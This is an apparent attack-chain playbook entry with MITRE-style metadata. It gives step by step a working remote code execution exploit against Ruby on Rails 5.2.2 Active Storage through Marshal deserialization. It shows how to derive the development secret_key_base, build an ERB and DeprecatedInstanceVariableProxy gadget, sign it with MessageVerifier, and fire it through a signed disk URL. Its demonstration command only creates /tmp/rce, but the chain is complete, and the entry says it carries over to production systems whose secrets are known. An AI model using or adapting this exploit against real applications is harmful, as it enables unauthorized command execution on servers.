---
tags:
  - rce
  - rails
  - deserialization
  - active-storage
  - marshal
type: attack_chain
tools:
  - '[[tools/rails-cli]]'
  - '[[tools/bundler]]'
  - '[[tools/rails-console]]'
  - '[[tools/web-browser]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Vulnerable-Rails-Application]]'
  - '[[procedures/Craft-Malicious-ERB-Payload-in-Rails-Console]]'
  - '[[procedures/Start-Rails-Development-Server]]'
  - '[[procedures/Exploit-RCE-via-Active-Storage-Signed-URL]]'
  - '[[procedures/Verify-RCE-Execution]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:49.421Z'
description: >-
  Demonstrates remote code execution by exploiting Marshal deserialization in
  ActiveSupport::MessageVerifier used for Active Storage signed URLs in Ruby on
  Rails.
skill_level: intermediate
impact_level: high
id: f1912ffe-b682-4f37-a55c-025254f583d5
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# RCE via Marshal Deserialization in Rails Active Storage Signed URLs

Multi-stage attack chain demonstrating a complete attack workflow exploiting object injection in Rails Active Storage to achieve remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Vulnerable App] --> B[Craft Payload]
    B --> C[Start Server]
    C --> D[Trigger URL]
    D --> E[Verify RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#e67e22
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/rails-cli]]
- [[tools/bundler]]
- [[tools/rails-console]]
- [[tools/web-browser]]

### Target Environment

- Ruby on Rails 5.2.2 application with Active Storage
- Development mode (guessable secret_key_base)
- Port 3000 open
- Linux/macOS for setup

### Initial Access Requirements

- Local access to setup vulnerable app
- Knowledge of Rails secret_key_base (MD5 of app name in dev mode)
- No authentication needed for public Active Storage endpoints

## Detailed Attack Procedures

### Step 1: Setup Vulnerable Rails Application
procedure: [[procedures/Setup-Vulnerable-Rails-Application]]

**Objective**: Create and prepare a vulnerable Rails 5.2.2 application to expose Active Storage endpoints.

**Instructions**: Verify Ruby and Rails versions, create a new app, install dependencies, and check routes.

First, check Ruby version using [[commands/check-ruby-version]]:

```bash
ruby -v
```

Expected: ruby 2.6.0p0 or compatible.

Then check Rails version using [[commands/check-rails-version]]:

```bash
rails -v
```

Expected: Rails 5.2.2.

Create the app with [[commands/create-new-rails-app]]:

```bash
rails new verifier_rce
```

Navigate with [[commands/change-directory-to-app]]:

```bash
cd verifier_rce/
```

Install gems using [[commands/bundle-install]]:

```bash
bundle install
```

List routes with [[commands/list-rails-routes]]:

```bash
bin/rails routes
```

Look for Active Storage routes like /rails/active_storage/disk/:encoded_key/*filename.

**Expected Output**: Rails app structure created, dependencies installed, Active Storage routes confirmed.

**Success Indicators**:
- App directory exists with Gemfile.lock
- Routes include Active Storage endpoints

### Step 2: Craft Malicious ERB Payload in Rails Console
procedure: [[procedures/Craft-Malicious-ERB-Payload-in-Rails-Console]]

**Objective**: Generate an encoded malicious payload using ERB for RCE deserialization.

**Instructions**: Enter Rails console and execute Ruby code to build and encode the payload.

Start console with [[commands/start-rails-console]]:

```bash
bundle exec rails console
```

In console, get app name with [[commands/get-app-class-name]]:

```ruby
app_class_name = VerifierRce::Application.name
```

Derive secret_key_base with [[commands/derive-secret-key-base]]:

```ruby
secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)
```

Create key generator with [[commands/create-key-generator]]:

```ruby
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
```

Generate secret with [[commands/generate-activestorage-secret]]:

```ruby
secret = key_generator.generate_key('ActiveStorage')
```

Create verifier with [[commands/create-message-verifier]]:

```ruby
verifier = ActiveSupport::MessageVerifier.new(secret)
```

Define code with [[commands/define-malicious-code]]:

```ruby
code = '`touch /tmp/rce`'
```

Allocate ERB with [[commands/allocate-erb-object]]:

```ruby
erb = ERB.allocate
```

Set src with [[commands/set-erb-src]]:

```ruby
erb.instance_variable_set :@src, code
```

Set filename with [[commands/set-erb-filename]]:

```ruby
erb.instance_variable_set :@filename, '1'
```

Set lineno with [[commands/set-erb-lineno]]:

```ruby
erb.instance_variable_set :@lineno, 1
```

Create proxy with [[commands/create-deprecation-proxy]]:

```ruby
dump_target = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
```

Generate payload with [[commands/generate-encoded-payload]]:

```ruby
verifier.generate(dump_target, purpose: :blob_key)
```

Copy the output encoded string (e.g., eyJfcmFpbHMiOnsibWVzc2FnZSI6...).

Exit console with exit.

**Expected Output**: Encoded payload string for use in URL.

**Success Indicators**:
- Payload generated without errors
- Encoded string copied

### Step 3: Start Rails Development Server
procedure: [[procedures/Start-Rails-Development-Server]]

**Objective**: Launch the server to host the vulnerable Active Storage endpoints.

**Instructions**: Start the server on localhost:3000.

Use [[commands/start-rails-server]]:

```bash
bin/rails s
```

**Expected Output**: Server running on http://0.0.0.0:3000.

**Success Indicators**:
- Server logs show startup
- Accessible via browser

### Step 4: Exploit RCE via Active Storage Signed URL
procedure: [[procedures/Exploit-RCE-via-Active-Storage-Signed-URL]]

**Objective**: Trigger deserialization and execute the malicious payload.

**Instructions**: Construct and access the malicious URL in a browser.

Use the encoded_key from Step 2 to build URL: http://localhost:3000/rails/active_storage/disk/{encoded_key}/*filename (e.g., /rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6.../dummy.txt).

Open in [[tools/web-browser]] and navigate to the URL.

This triggers ActiveStorage::DiskController#decode_verified_key, deserializing via Marshal and executing ERB.

**Expected Output**: Server executes `touch /tmp/rce` (no visible response, but side effect occurs).

**Success Indicators**:
- No 404 or verification error
- File created on server

### Step 5: Verify RCE Execution
procedure: [[procedures/Verify-RCE-Execution]]

**Objective**: Confirm the payload executed by checking for the created file.

**Instructions**: In a new terminal, check for the file.

Use [[commands/check-rce-file]]:

```bash
ls /tmp/rce
```

**Expected Output**: /tmp/rce file exists.

**Success Indicators**:
- File listed, confirming RCE

## Attack Chain Summary

### Key Achievements

1. Setup vulnerable Rails app with Active Storage
2. Crafted ERB-based RCE payload exploiting Marshal
3. Triggered deserialization via signed URL for arbitrary command execution
4. Verified impact in development mode (applicable to production with known secrets)

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
